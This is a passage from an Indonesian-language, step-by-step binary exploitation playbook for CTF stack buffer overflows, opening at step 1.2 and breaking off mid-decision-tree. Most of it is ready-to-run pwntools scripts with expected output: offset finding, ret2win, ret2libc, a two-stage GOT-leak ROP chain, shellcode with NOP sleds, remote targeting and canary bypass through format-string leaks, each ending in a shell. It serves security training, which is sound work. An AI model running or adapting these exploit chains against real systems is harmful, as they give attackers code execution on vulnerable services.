### Langkah 1.2 — Reproduksi Crash di GDB

Bash

```
# Buka binary di GDB dengan pwndbg
gdb $BINARY
```

gdb

```
# Di dalam GDB:
set disassembly-flavor intel
run < <(python3 -c 'import sys; sys.stdout.buffer.write(b"A"*200)')
```

**OUTPUT BERHASIL ✅ — Crash di GDB:**

text

```
Program received signal SIGSEGV, Segmentation fault.
0x00000000004141414141414141 in ?? ()

──────────────────[ REGISTERS ]──────────────────
 RIP  0x4141414141414141
 RSP  0x7fffffffe1c8 ◂— 'AAAAAAAAA...'
```

➡️ RIP sudah terisi 'A' (0x41) → **RIP CONTROL TERBUKTI!** Lanjut ke Fase 2.

**OUTPUT BERHASIL ✅ — Crash tapi RIP tidak berisi A:**

text

```
Program received signal SIGSEGV, Segmentation fault.
0x00000000004011d4 in main ()
```

➡️ Crash tapi bukan di RIP. Cek RSP:

gdb

```
x/20gx $rsp
# Apakah stack berisi AAAA?
```

**OUTPUT GAGAL ❌ — SIGABRT (canary):**

text

```
Program received signal SIGABRT, Aborted.
*** stack smashing detected ***
```

➡️ Canary aktif. Lanjut ke Fase 2 dulu untuk temukan offset, nanti ke Fase 7 untuk canary bypass.

---

## ═══════════════════════════════════════

## FASE 2: MENEMUKAN OFFSET

## ═══════════════════════════════════════

> **Tujuan:** Temukan berapa byte padding yang dibutuhkan sebelum RIP/EIP dimulai.

### Langkah 2.1 — Generate Cyclic Pattern (RECOMMENDED)

Bash

```
# Generate cyclic pattern 300 byte (sesuaikan jika perlu lebih)
python3 -c 'from pwn import *; sys.stdout.buffer.write(cyclic(300))'

# Atau simpan ke file
python3 -c 'from pwn import *; sys.stdout.buffer.write(cyclic(300))' > /tmp/cyclic.bin
```

**Output yang diharapkan:**

text

```
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama...
```

---

### Langkah 2.2 — Jalankan Cyclic di GDB

Bash

```
gdb $BINARY
```

gdb

```
# Method 1: Process substitution (RECOMMENDED)
run < <(python3 -c 'from pwn import *; sys.stdout.buffer.write(cyclic(300))')

# Method 2: Dari file
run < /tmp/cyclic.bin

# Method 3: Jika input via argv
run $(python3 -c 'from pwn import *; print(cyclic(300).decode())')
```

**OUTPUT BERHASIL ✅ — Crash dengan cyclic di RIP (32-bit):**

text

```
Program received signal SIGSEGV, Segmentation fault.
0x6161616e in ?? ()

pwndbg> info registers eip
eip    0x6161616e    0x6161616e
```

➡️ EIP berisi `0x6161616e` → cari offset:

Bash

```
python3 -c 'from pwn import *; print(cyclic_find(0x6161616e))'
# Output: 72
```

**OUTPUT BERHASIL ✅ — Crash dengan cyclic di RIP (64-bit):**

text

```
Program received signal SIGSEGV, Segmentation fault.
0x0000000000400000 in ?? ()  ← RIP mungkin tidak langsung berisi pattern
```

➡️ Pada 64-bit, RIP sering tidak menampilkan cyclic langsung (canonical address issue). Cek RSP:

gdb

```
# Lihat top of stack
x/1gx $rsp
# Output: 0x7fffffffe1c8: 0x6161616161616162

# Atau gunakan pwndbg:
cyclic -l $rsp
```

**Lalu cari offset:**

Bash

```
# Untuk 64-bit, gunakan n=8
python3 -c 'from pwn import *; print(cyclic_find(0x6161616161616162, n=8))'
# Output: 72
```

**OUTPUT BERHASIL ✅ — pwndbg langsung kasih offset:**

text

```
pwndbg> cyclic -l $rsp
Finding cyclic pattern of 8 bytes: b'baaaaaaa' (hex: 0x6261616161616161)
Found at offset 72
```

➡️ **OFFSET = 72** → catat ini!

**OUTPUT GAGAL ❌ — cyclic_find returns -1 atau None:**

text

```
-1
```

➡️ Pattern tidak ditemukan. Kemungkinan:

1. Pattern terlalu pendek → gunakan `cyclic(500)` atau lebih besar
2. Endianness issue → coba:

Bash

```
# Ambil 4 byte dari RSP
gdb> x/1wx $rsp
# Output: 0x61616162
python3 -c 'from pwn import *; print(cyclic_find(0x61616162))'
```

**OUTPUT GAGAL ❌ — Stack smashing (SIGABRT) muncul sebelum cyclic di RIP:**

text

```
*** stack smashing detected ***
```

➡️ Cyclic sudah melewati canary. Offset yang kamu cari adalah **canary offset** (sebelum canary), bukan RIP offset langsung. Track ke Fase 7.

---

### Langkah 2.3 — Verifikasi Offset dengan 'B' Test

Bash

```
# Setelah dapat offset (contoh: 72)
export OFFSET=72

# Kirim padding + 8 byte 'B' untuk verify
python3 -c "
from pwn import *
payload = b'A' * $OFFSET + b'B' * 8
sys.stdout.buffer.write(payload)
" | ./$BINARY
```

gdb

```
# Di GDB:
run < <(python3 -c "
from pwn import *
payload = b'A' * $OFFSET + b'B' * 8
sys.stdout.buffer.write(payload)
")

info registers rip
```

**OUTPUT BERHASIL ✅ — RIP control terkonfirmasi:**

text

```
rip    0x4242424242424242    0x4242424242424242
```

`B = 0x42` → RIP terisi B → **RIP CONTROL CONFIRMED!**

➡️ **Simpan offset:**

Bash

```
echo "OFFSET=$OFFSET" >> ~/bof_work/notes.txt
echo "Binary: $BINARY" >> ~/bof_work/notes.txt
```

Lanjut ke **Fase 3.**

**OUTPUT GAGAL ❌ — RIP tidak berisi 0x4242...:**

text

```
rip    0x401234    (masih address binary)
```

➡️ Offset salah. Kemungkinan:

- Off by 1 → coba `OFFSET-1` dan `OFFSET+1`
- Ada padding/alignment → periksa di Ghidra ukuran buffer sesungguhnya
- Input di-null-terminate → coba tanpa newline: `p.send(payload)` bukan `p.sendline()`

---

## ═══════════════════════════════════════

## FASE 3: PILIH STRATEGI EXPLOIT

## ═══════════════════════════════════════

> Berdasarkan hasil checksec di Fase 0, ikuti path yang sesuai:

text

```
OFFSET CONFIRMED
│
├─ Canary: YES → FASE 7 (Canary Bypass) dulu, lalu balik ke sini
│
├─ NX: disabled → FASE 4D (Shellcode)
│
├─ NX: enabled
│   ├─ Ada win() / flag() / shell() → FASE 4A (ret2win)
│   ├─ Tidak ada win(), PIE: disabled → FASE 4B (ret2libc simple)
│   └─ Tidak ada win(), PIE: enabled / ASLR aktif → FASE 4C (ROP + Leak)
```

---

## ═══════════════════════════════════════

## FASE 4A: ret2win (PALING MUDAH)

## ═══════════════════════════════════════

> **Prasyarat:** Ada function `win()` / `flag()` / `shell()` di binary

### Langkah 4A.1 — Temukan Address win()

Bash

```
# Method 1: nm (paling cepat)
nm $BINARY | grep -E 'win|flag|shell|admin'

# Method 2: readelf
readelf -s $BINARY | grep -E 'win|flag|shell'

# Method 3: GDB
gdb $BINARY
# Di dalam GDB:
info functions
# Cari: win / flag / shell

# Method 4: Ghidra (jika stripped)
# Symbol Tree → Functions → cari fungsi yang panggil system("/bin/sh") atau puts("flag")
```

**OUTPUT BERHASIL ✅:**

text

```
0000000000401176 T win
```

➡️ win() ada di `0x401176`

**OUTPUT GAGAL ❌ — nm tidak temukan:**

text

```
nm: no symbols
```

➡️ Binary stripped. Gunakan Ghidra atau pwntools:

Python

```
from pwn import *
elf = ELF("./binary")
# Coba semua nama fungsi umum
for name in ['win', 'flag', 'shell', 'backdoor', 'secret', 'hidden']:
    if name in elf.sym:
        print(f"{name} @ {hex(elf.sym[name])}")
```

---

### Langkah 4A.2 — Cek Isi win() di GDB

gdb

```
# Pastikan win() benar-benar berguna
disassemble win

# Atau di Ghidra: lihat decompile win()
```

**OUTPUT BERHASIL ✅ — win() ada shell:**

asm

```
<win>:
   call   system@plt
   ; atau
   mov    edi, offset "/bin/sh"
   call   system
```

**OUTPUT BERHASIL ✅ — win() ada flag:**

asm

```
<win>:
   call   puts@plt
   ; "FLAG{...}" atau baca file flag.txt
```

**OUTPUT BERBEDA 🟡 — win() butuh argumen:**

C

```
// Decompile menunjukkan:
void win(int check1, int check2) {
    if (check1 == 0xdeadbeef && check2 == 0xcafebabe) {
        system("/bin/sh");
    }
}
```

➡️ Butuh set argument. Pada 64-bit = set RDI dan RSI. Lanjut ke Langkah 4A.3b

---

### Langkah 4A.3a — Build Exploit ret2win (Simple)

Python

```
#!/usr/bin/env python3
# ~/bof_work/scripts/ret2win.py
from pwn import *

# ==================== CONFIG ====================
BINARY = "./vuln"
LOCAL = True
HOST = "ctf.example.com"
PORT = 1337
# ================================================

elf = ELF(BINARY, checksec=False)
context.binary = elf
context.log_level = "info"

OFFSET = 72  # Ganti dengan offset yang kamu temukan
WIN = elf.sym["win"]
log.info(f"win() @ {hex(WIN)}")

# Build payload
payload = flat(
    b"A" * OFFSET,
    p64(WIN)
)

# Connect
if LOCAL:
    p = process(elf.path)
else:
    p = remote(HOST, PORT)

# Handle prompt jika ada
# p.recvuntil(b"Enter: ")  # Uncomment jika ada prompt

p.sendline(payload)
p.interactive()
```

Bash

```
python3 ~/bof_work/scripts/ret2win.py
```

**OUTPUT BERHASIL ✅:**

text

```
[*] win() @ 0x401176
[*] Starting local process './vuln'
[*] Switching to interactive mode
Congratulations! Here's your flag:
FLAG{ret2win_success}
```

➡️ **SOLVED!**

**OUTPUT GAGAL ❌ — Crash di dalam win():**

text

```
[*] Process './vuln' stopped with exit code -11 (SIGSEGV)
```

➡️ **Stack alignment issue!** Tambahkan `ret` gadget:

---

### Langkah 4A.3b — ret2win + Stack Alignment Fix

Python

```
#!/usr/bin/env python3
from pwn import *

BINARY = "./vuln"
elf = ELF(BINARY, checksec=False)
context.binary = elf

OFFSET = 72
WIN = elf.sym["win"]

# Cari gadget 'ret' untuk alignment
rop = ROP(elf)
RET = rop.find_gadget(["ret"])[0]
log.info(f"ret gadget @ {hex(RET)}")
log.info(f"win() @ {hex(WIN)}")

# Payload dengan alignment fix
payload = flat(
    b"A" * OFFSET,
    p64(RET),    # Extra ret untuk 16-byte stack alignment
    p64(WIN)
)

p = process(elf.path)
p.sendline(payload)
p.interactive()
```

**OUTPUT BERHASIL ✅:**

text

```
[*] ret gadget @ 0x40101a
[*] win() @ 0x401176
$ whoami
ctf
$ cat flag.txt
FLAG{alignment_fixed}
```

**OUTPUT GAGAL ❌ — Masih crash setelah alignment fix:**

text

```
SIGSEGV
```

➡️ Cek di GDB apakah RIP sudah benar mengarah ke win(). Kemungkinan:

1. win() butuh argumen → langkah berikutnya
2. win() ada di PIE → butuh leak base address dulu

---

### Langkah 4A.3c — ret2win dengan Argumen (64-bit)

Python

```
#!/usr/bin/env python3
from pwn import *

BINARY = "./vuln"
elf = ELF(BINARY, checksec=False)
context.binary = elf

OFFSET = 72
WIN = elf.sym["win"]

rop = ROP(elf)
RET = rop.find_gadget(["ret"])[0]
POP_RDI = rop.find_gadget(["pop rdi", "ret"])[0]
POP_RSI = rop.find_gadget(["pop rsi", "ret"])[0]

log.info(f"pop rdi @ {hex(POP_RDI)}")
log.info(f"pop rsi @ {hex(POP_RSI)}")
log.info(f"win() @ {hex(WIN)}")

# win(0xdeadbeef, 0xcafebabe)
payload = flat(
    b"A" * OFFSET,
    p64(RET),           # alignment
    p64(POP_RDI),       # set RDI (arg1)
    p64(0xdeadbeef),
    p64(POP_RSI),       # set RSI (arg2)
    p64(0xcafebabe),
    p64(WIN)
)

p = process(elf.path)
p.sendline(payload)
p.interactive()
```

**OUTPUT GAGAL ❌ — pop rsi tidak ditemukan:**

text

```
RuntimeError: No gadget found
```

➡️ Cari manual:

Bash

```
ROPgadget --binary $BINARY | grep "pop rsi"
ROPgadget --binary $BINARY | grep "pop rsi ; pop r15 ; ret"
# Kadang ada "pop rsi ; pop r15 ; ret" → set r15 = 0 (dummy)
```

---

## ═══════════════════════════════════════

## FASE 4B: ret2libc (NX ON, PIE OFF, ASLR OFF/simple)

## ═══════════════════════════════════════

> **Prasyarat:** Tidak ada win(), NX enabled, PIE disabled

### Langkah 4B.1 — Identifikasi libc

Bash

```
# Lihat libc yang digunakan
ldd $BINARY

# Cek versi libc
/lib/x86_64-linux-gnu/libc.so.6 --version
strings /lib/x86_64-linux-gnu/libc.so.6 | grep "GNU C Library"

# Simpan path libc
export LIBC_PATH="/lib/x86_64-linux-gnu/libc.so.6"
```

**OUTPUT BERHASIL ✅:**

text

```
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f8a3c000000)
```

---

### Langkah 4B.2 — Cari Gadget dan Offset

Bash

```
# Cari pop rdi ; ret (untuk set argument system())
ROPgadget --binary $BINARY | grep "pop rdi"

# Cari ret (untuk alignment)
ROPgadget --binary $BINARY | grep ": ret$"

# Atau gunakan pwntools
python3 -c "
from pwn import *
elf = ELF('$BINARY')
rop = ROP(elf)
print('pop rdi:', hex(rop.find_gadget(['pop rdi','ret'])[0]))
print('ret:', hex(rop.find_gadget(['ret'])[0]))
"
```

**OUTPUT BERHASIL ✅:**

text

```
0x00000000004012b3 : pop rdi ; ret
0x000000000040101a : ret
```

**OUTPUT GAGAL ❌ — Tidak ada pop rdi di binary:**

text

```
# Tidak ada output
```

➡️ Cari di libc:

Bash

```
ROPgadget --binary $LIBC_PATH | grep "pop rdi ; ret"
```

Atau gunakan ret2csu (lanjut ke [🔗 50 — ROP Chain Workflow](/docs/rop-chain))

---

### Langkah 4B.3 — Cari system() dan /bin/sh

Python

```
#!/usr/bin/env python3
from pwn import *

LIBC_PATH = "/lib/x86_64-linux-gnu/libc.so.6"
libc = ELF(LIBC_PATH, checksec=False)

# Offset dalam libc (bukan absolute address)
print(f"system offset: {hex(libc.sym['system'])}")
print(f"/bin/sh offset: {hex(next(libc.search(b'/bin/sh\\x00')))}")
```

**OUTPUT BERHASIL ✅:**

text

```
system offset: 0x4c490
/bin/sh offset: 0x1b45bd
```

> **⚠️ PENTING:** Nilai ini adalah OFFSET dalam libc, bukan runtime address. Kalau ASLR aktif, kamu butuh leak base dulu (ke Fase 4C).

---

### Langkah 4B.4 — Build ret2libc (ASLR OFF — lab/CTF dengan ASLR disabled)

Bash

```
# Cek status ASLR di sistem
cat /proc/sys/kernel/randomize_va_space
# 0 = disabled, 1 = partial, 2 = full
```

**Jika ASLR = 0 (disabled):**

Python

```
#!/usr/bin/env python3
# ~/bof_work/scripts/ret2libc_simple.py
from pwn import *

BINARY = "./vuln"
LIBC_PATH = "/lib/x86_64-linux-gnu/libc.so.6"

elf = ELF(BINARY, checksec=False)
libc = ELF(LIBC_PATH, checksec=False)
context.binary = elf

OFFSET = 72

rop = ROP(elf)
POP_RDI = rop.find_gadget(["pop rdi", "ret"])[0]
RET = rop.find_gadget(["ret"])[0]

# Dapatkan libc base — dengan ASLR off, ini konsisten
# Jalankan binary sekali dan cek /proc/PID/maps, atau:
p = process(elf.path)
libc.address = int(open(f"/proc/{p.pid}/maps").read().split("libc")[1].split("-")[0].splitlines()[-1].strip(), 16)
# Atau hardcode setelah cek manual:
# libc.address = 0x7ffff7dc0000

SYSTEM = libc.sym["system"]
BINSH = next(libc.search(b"/bin/sh\x00"))

log.info(f"libc base: {hex(libc.address)}")
log.info(f"system: {hex(SYSTEM)}")
log.info(f"/bin/sh: {hex(BINSH)}")

payload = flat(
    b"A" * OFFSET,
    p64(RET),       # alignment
    p64(POP_RDI),   # pop rdi; ret
    p64(BINSH),     # "/bin/sh" → RDI
    p64(SYSTEM)     # call system("/bin/sh")
)

p.sendline(payload)
p.interactive()
```

**OUTPUT BERHASIL ✅:**

text

```
[*] libc base: 0x7ffff7dc0000
[*] system: 0x7ffff7e0c490
[*] /bin/sh: 0x7ffff7f945bd
$ id
uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
```

**OUTPUT GAGAL ❌ — SIGSEGV di dalam system():**

text

```
Program received signal SIGSEGV
# Di GDB: crash di movaps instruction di dalam system()
```

➡️ Stack alignment issue di system(). Tambahkan extra `ret`:

Python

```
payload = flat(
    b"A" * OFFSET,
    p64(RET),       # alignment fix 1
    p64(RET),       # alignment fix 2 (coba salah satu atau dua)
    p64(POP_RDI),
    p64(BINSH),
    p64(SYSTEM)
)
```

---

## ═══════════════════════════════════════

## FASE 4C: ROP + LEAK (ASLR ON / PIE ON)

## ═══════════════════════════════════════

> **Prasyarat:** ASLR aktif dan/atau PIE enabled — address berubah setiap run

> **Konsep:** Kita perlu **leak** runtime address dari libc, lalu hitung base, lalu exploit lagi di run yang sama (2-stage exploit).

### Langkah 4C.1 — Pahami GOT/PLT sebagai Leak Target

Bash

```
# Lihat fungsi PLT yang tersedia (fungsi yang dipanggil binary dari libc)
python3 -c "
from pwn import *
elf = ELF('$BINARY')
print('PLT functions:', list(elf.plt.keys()))
print('GOT entries:', list(elf.got.keys()))
"
```

**OUTPUT BERHASIL ✅:**

text

```
PLT functions: ['puts', 'printf', 'gets', 'read']
GOT entries: ['puts', 'printf', 'gets', 'read']
```

➡️ Ada `puts` di PLT → kita bisa panggil `puts(puts@GOT)` untuk leak address puts di libc

---

### Langkah 4C.2 — Build 2-Stage Exploit: Leak → Calculate → Shell

Python

```
#!/usr/bin/env python3
# ~/bof_work/scripts/ret2libc_aslr.py
from pwn import *

BINARY = "./vuln"
LIBC_PATH = "/lib/x86_64-linux-gnu/libc.so.6"

elf = ELF(BINARY, checksec=False)
libc = ELF(LIBC_PATH, checksec=False)
context.binary = elf
context.log_level = "info"

OFFSET = 72

rop = ROP(elf)
POP_RDI = rop.find_gadget(["pop rdi", "ret"])[0]
RET = rop.find_gadget(["ret"])[0]

# Alamat yang tidak berubah (bisa digunakan karena PIE off)
PUTS_PLT = elf.plt["puts"]     # Fungsi puts di PLT
PUTS_GOT = elf.got["puts"]     # Entri GOT puts (berisi runtime address)
MAIN = elf.sym["main"]         # Kembali ke main setelah leak

log.info(f"puts@PLT: {hex(PUTS_PLT)}")
log.info(f"puts@GOT: {hex(PUTS_GOT)}")

p = process(elf.path)

# === STAGE 1: LEAK puts@libc runtime address ===
payload_stage1 = flat(
    b"A" * OFFSET,
    p64(POP_RDI),    # pop rdi; ret
    p64(PUTS_GOT),   # RDI = puts@GOT (yang berisi runtime address puts)
    p64(PUTS_PLT),   # call puts(puts@GOT) → cetak runtime address puts
    p64(MAIN)        # setelah puts, balik ke main untuk stage 2
)

# Handle prompt jika ada
# p.recvuntil(b"Enter: ")

p.sendline(payload_stage1)

# Baca leak (puts mencetak 8 byte address + newline)
leaked = p.recvline().strip()
leaked_puts = u64(leaked.ljust(8, b"\x00"))
log.success(f"Leaked puts@libc: {hex(leaked_puts)}")

# === HITUNG LIBC BASE ===
libc.address = leaked_puts - libc.sym["puts"]
log.success(f"libc base: {hex(libc.address)}")

SYSTEM = libc.sym["system"]
BINSH = next(libc.search(b"/bin/sh\x00"))
log.info(f"system: {hex(SYSTEM)}")
log.info(f"/bin/sh: {hex(BINSH)}")

# === STAGE 2: SHELL ===
payload_stage2 = flat(
    b"A" * OFFSET,
    p64(RET),        # alignment
    p64(POP_RDI),
    p64(BINSH),
    p64(SYSTEM)
)

# Handle prompt main yang muncul lagi
# p.recvuntil(b"Enter: ")
p.sendline(payload_stage2)
p.interactive()
```

**OUTPUT BERHASIL ✅:**

text

```
[*] puts@PLT: 0x401050
[*] puts@GOT: 0x404018
[+] Leaked puts@libc: 0x7f8a3c4e8970
[+] libc base: 0x7f8a3c4a0000
[*] system: 0x7f8a3c4ec490
[*] /bin/sh: 0x7f8a3c6745bd
[*] Switching to interactive mode
$ id
uid=1000(ctf) gid=1000(ctf)
```

**OUTPUT GAGAL ❌ — Leak tidak terbaca / null bytes:**

text

```
Leaked puts@libc: 0x0
# atau
b''
```

➡️ Masalah parsing. Address mengandung null byte atau format berbeda:

Python

```
# Coba baca lebih banyak dan parse manual
output = p.recv(timeout=1)
log.info(f"Raw output: {output}")
# Ambil 6 atau 8 byte pertama
leaked_puts = u64(output[:6].ljust(8, b"\x00"))
```

**OUTPUT GAGAL ❌ — "Wrong libc version":**

text

```
# Shell muncul tapi langsung crash
# atau tidak ada output setelah shell
```

➡️ Libc yang kamu gunakan berbeda dengan yang di target. Teknik identifikasi:

Bash

```
# Gunakan libc database online
# https://libc.rip/ atau https://libc.blukat.me/
# Input: leaked address + function name
# → Dapatkan versi dan offset yang tepat

# Atau dari CTF: biasanya ada file libc yang disertakan
ls -la libc*
file libc*
```

---

## ═══════════════════════════════════════

## FASE 4D: SHELLCODE (NX DISABLED)

## ═══════════════════════════════════════

> **Prasyarat:** `checksec` menunjukkan `NX: disabled`

### Langkah 4D.1 — Konfirmasi NX Disabled

Bash

```
checksec --file=$BINARY | grep NX
# Harus: NX: disabled (atau NX bit not set)

# Cek juga di GDB
gdb $BINARY
# gdb> info proc mappings
# Cari stack segment — apakah ada 'x' (executable) permission?
```

**OUTPUT BERHASIL ✅ — Stack executable:**

text

```
0x7ffffffde000  0x7ffffffff000  rwx  [stack]
```

➡️ Stack executable → shellcode bisa dijalankan di sini

---

### Langkah 4D.2 — Temukan Buffer Address

gdb

```
gdb $BINARY
break vulnerable_func   # Atau fungsi yang ada gets/strcpy/read
run < <(python3 -c 'import sys; sys.stdout.buffer.write(b"A"*100)')

# Setelah break:
info registers rsp
x/20gx $rsp

# Jika ada debug symbol:
p &buffer
# Output: $1 = (char (*)[64]) 0x7fffffffe1d0
```

**OUTPUT BERHASIL ✅:**

text

```
$1 = (char (*)[64]) 0x7fffffffe1d0
```

➡️ `BUFFER_ADDR = 0x7fffffffe1d0`

> **⚠️ PENTING:** Jika ASLR aktif, address ini berubah setiap run. Untuk ASLR aktif dengan NX disabled → butuh leak atau NOP sled.

---

### Langkah 4D.3 — Build Shellcode Exploit

Python

```
#!/usr/bin/env python3
# ~/bof_work/scripts/shellcode.py
from pwn import *

BINARY = "./vuln"
elf = ELF(BINARY, checksec=False)
context.binary = elf
context.log_level = "info"

OFFSET = 72

# Generate shellcode sesuai arsitektur
shellcode = asm(shellcraft.sh())
log.info(f"Shellcode length: {len(shellcode)} bytes")
log.info(f"Shellcode:\n{disasm(shellcode)}")

# Pastikan shellcode muat sebelum padding
if len(shellcode) >= OFFSET:
    log.error(f"Shellcode ({len(shellcode)} bytes) >= OFFSET ({OFFSET})! Tidak muat.")
    exit(1)

# Address buffer (dari Langkah 4D.2)
BUFFER_ADDR = 0x7fffffffe1d0

# Build payload:
# [SHELLCODE][PADDING][BUFFER_ADDR]
payload = flat(
    shellcode,
    b"A" * (OFFSET - len(shellcode)),  # Padding sisa
    p64(BUFFER_ADDR)                    # RIP → awal buffer = shellcode
)

p = process(elf.path)
p.sendline(payload)
p.interactive()
```

**OUTPUT BERHASIL ✅:**

text

```
[*] Shellcode length: 48 bytes
[*] Starting local process './vuln'
$ id
uid=1000(ctf)
$ cat flag.txt
FLAG{shellcode_exec}
```

**OUTPUT GAGAL ❌ — SIGSEGV walau NX disabled:**

text

```
Segmentation fault
```

➡️ Kemungkinan BUFFER_ADDR bergeser. Debug:

Python

```
# Tambahkan NOP sled untuk toleransi address
NOP_SLED = b"\x90" * 50  # 50 NOP bytes
payload = flat(
    NOP_SLED,              # NOP sled = jika address sedikit meleset masih OK
    shellcode,
    b"A" * (OFFSET - len(NOP_SLED) - len(shellcode)),
    p64(BUFFER_ADDR + 25)  # Arahkan ke tengah NOP sled
)
```

**OUTPUT GAGAL ❌ — Shellcode mengandung null byte:**

text

```
# Input terpotong di null byte
```

➡️ Gunakan encoder:

Python

```
# Gunakan shellcode yang null-free
context.arch = "amd64"
shellcode = asm(shellcraft.linux.sh())
# Cek:
if b"\x00" in shellcode:
    log.warning("Shellcode contains null bytes!")
    # Gunakan msfvenom atau custom shellcode
```

---

## ═══════════════════════════════════════

## FASE 5: REMOTE EXPLOIT

## ═══════════════════════════════════════

> Setelah exploit bekerja secara lokal, adaptasi untuk remote CTF target.

### Langkah 5.1 — Identifikasi Perbedaan Local vs Remote

Python

```
# Hal yang berubah di remote:
# 1. Libc version mungkin berbeda
# 2. Address mungkin berbeda (ASLR pada server)
# 3. Network delay

# Template switch local/remote
LOCAL = False  # Ganti ke False untuk remote

if LOCAL:
    p = process(elf.path)
    # Dapatkan libc path local
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
else:
    p = remote("ctf.example.com", 1337)
    # Gunakan libc yang disertakan CTF atau identifikasi dari leak
    libc = ELF("./libc.so.6")  # File libc dari CTF challenge
```

---

### Langkah 5.2 — Identifikasi Libc Remote (Jika Berbeda)

Python

```
# Jika CTF tidak kasih libc, gunakan leaked address untuk identifikasi
# Leak puts@libc seperti di Fase 4C Stage 1
# Lalu:

leaked_puts = 0x7f8a3c4e8970  # dari output stage 1

# Cek di https://libc.rip/
# Input: function=puts, address=leaked_puts
# → Dapatkan: libc versi dan offset

# Atau gunakan tools:
# pip install libcsearch
# libcsearch puts 0x4e8970  # 3 byte terakhir dari leak
```

**OUTPUT BERHASIL ✅ — libc teridentifikasi:**

text

```
libc6_2.31-13_amd64
  puts: 0x875a0
  system: 0x55410
  /bin/sh: 0x1b75aa
```

➡️ Gunakan offset ini:

Python

```
libc.sym["puts"] = 0x875a0
libc.sym["system"] = 0x55410
# dll
```

---

## ═══════════════════════════════════════

## FASE 6: CANARY BYPASS (JIKA CANARY ADA)

## ═══════════════════════════════════════

> **Prasyarat:** `checksec` menunjukkan `Stack: Canary found`

### Langkah 6.1 — Pahami Canary

text

```
Stack layout dengan canary:
┌───────────────┐
│   buffer[64]  │ ← input masuk di sini
├───────────────┤
│   CANARY      │ ← random, berakhir \x00
├───────────────┤
│   saved RBP   │
├───────────────┤
│   saved RIP   │ ← target kita
└───────────────┘
```

Canary = nilai random 8 byte yang berakhir `\x00`.  
Jika overflow dan canary tertimpa → `SIGABRT`.

---

### Langkah 6.2 — Cek Apakah Ada Format String atau Info Leak

Bash

```
# Apakah ada printf dengan user input?
./$BINARY
# Input: %p %p %p %p %p %p %p
# Jika output: 0x7f... 0x... → format string vulnerability!
# Ini bisa leak canary
```

**OUTPUT BERHASIL ✅ — Format string leak:**

text

```
Input: %p %p %p %p %p %p %p
0x7ffe... 0x4141... (nil) 0x7f... 0x400... 0x1234567812345600 ...
```

➡️ Angka terakhir yang berakhir `00` kemungkinan adalah canary!

Python

```
# Leak canary via format string
p.sendline(b"%7$p")  # Ganti angka sesuai posisi canary di stack
canary = int(p.recvline(), 16)
log.info(f"Canary: {hex(canary)}")
```

---

### Langkah 6.3 — Off-by-One / Partial Overwrite Canary Leak

Python

```
# Jika ada fungsi yang baca satu byte sebelum canary berakhir (overread)
# Atau jika ada loop dengan banyak input

# Cek: apakah binary punya fungsi yang print ulang input?
# Seperti: printf("%s", buf) setelah input
# → Jika buffer tidak null-terminated → bisa baca melewati buffer ke canary!

# Coba:
p.sendline(b"A" * 64)  # Isi buffer penuh tanpa null byte
leaked = p.recvline()   # Apakah ada data bocor setelah AAAA?
```

---

### Langkah 6.4 — Build Exploit dengan Canary

Python

```
#!/usr/bin/env python3
from pwn import *

BINARY = "./vuln"
elf = ELF(BINARY, checksec=False)
context.binary = elf

OFFSET_TO_CANARY = 64  # Jarak dari awal buffer ke canary
CANARY = 0x1234567812345600  # Dari leak (ganti dengan nilai aktual)
WIN = elf.sym["win"]

rop = ROP(elf)
RET = rop.find_gadget(["ret"])[0]

payload = flat(
    b"A" * OFFSET_TO_CANARY,   # Isi sampai canary
    p64(CANARY),                # Tulis ulang canary dengan nilai yang sama
    p64(0),                     # saved RBP (bisa 0 atau nilai lama)
    p64(RET),                   # alignment
    p64(WIN)                    # RIP → win()
)

p = process(elf.path)
p.sendline(payload)
p.interactive()
```

---

## ═══════════════════════════════════════

## TROUBLESHOOTING — SEMUA ERROR & SOLUSINYA

## ═══════════════════════════════════════

|Error / Situasi|Penyebab|Solusi|
|---|---|---|
|`Segmentation fault` langsung|Buffer overflow berhasil tapi RIP salah|Verifikasi offset dengan 'B' test|
|`SIGABRT` / `stack smashing`|Canary tertimpa|Ke Fase 6: Canary bypass|
|`SIGILL`|CPU execute invalid opcode|Address/payload salah — cek di GDB|
|`cyclic_find` return -1|Pattern tidak ditemukan|Pattern terlalu pendek, atau nilai dari register bukan pattern|
|RIP tidak berisi pattern 64-bit|Canonical address restriction|Cek RSP, bukan RIP|
|`win()` address benar tapi crash|Stack misalignment|Tambah `ret` gadget sebelum win()|
|`system()` crash di movaps|Stack alignment 16-byte|Tambah/kurangi `ret` gadget|
|Exploit local OK, remote crash|Libc berbeda|Identifikasi libc dari leak|
|`puts()` leak = 0x0|GOT belum diisi (lazy binding)|Pastikan puts sudah dipanggil sebelumnya|
|Leak terpotong null byte|Output parsing issue|Gunakan `p.recv(6).ljust(8, b"\x00")`|
|PIE enabled, address berubah|ASLR randomize binary base|Butuh binary base leak + offset calculation|
|Canary berubah setiap run|ASLR pada canary|Leak canary per-run, bukan hardcode|
|`sendline()` merusak payload|Newline byte masuk payload|Gunakan `send()` untuk raw bytes|
|Input terpotong di null byte|`gets`/`scanf` stop di null|Hindari null byte di payload|
|GDB bekerja, tanpa GDB tidak|ASLR berbeda atau env var berubah|Gunakan `context.aslr = False` untuk test lokal|

---

### Google Search Guide (Jika Buntu):

text

```
# Canary bypass technique:
site:ctftime.org "stack canary bypass" writeup

# Jika crash di libc dan tidak mengerti:
"movaps crash exploit" stack alignment fix x86_64

# Jika tidak ada gadget yang cocok:
"ret2csu" technique binary exploitation

# Identifikasi libc dari leak:
libc database lookup puts address

# Jika binary stripped dan tidak ada symbol:
"stripped binary" pwn ghidra function identification
```

---

## ═══════════════════════════════════════

## MASTER DECISION TREE (RINGKASAN)

## ═══════════════════════════════════════

text

```
START: Ada binary ELF yang crash
│
├─ FASE 0: Analisis
│   ├─ file → 32-bit (EIP/p32) atau 64-bit (RIP/p64)
│   ├─ checksec → catat Canary/NX/PIE
│   └─ nm → ada win()?
│
├─ FASE 1: Konfirmasi crash
│   ├─ [Crash] → lanjut
│   └─ [Tidak crash] → naikkan input size
│
├─ FASE 2: Temukan offset
│   ├─ cyclic pattern → crash → cari offset
│   └─ Verify dengan 'B' test → RIP = 0x4242...
│
├─ FASE 3: Pilih strategi
│   ├─ [Canary YES] → Fase 6 (leak canary) dulu
│   ├─ [NX OFF] → Fase 4D (Shellcode)
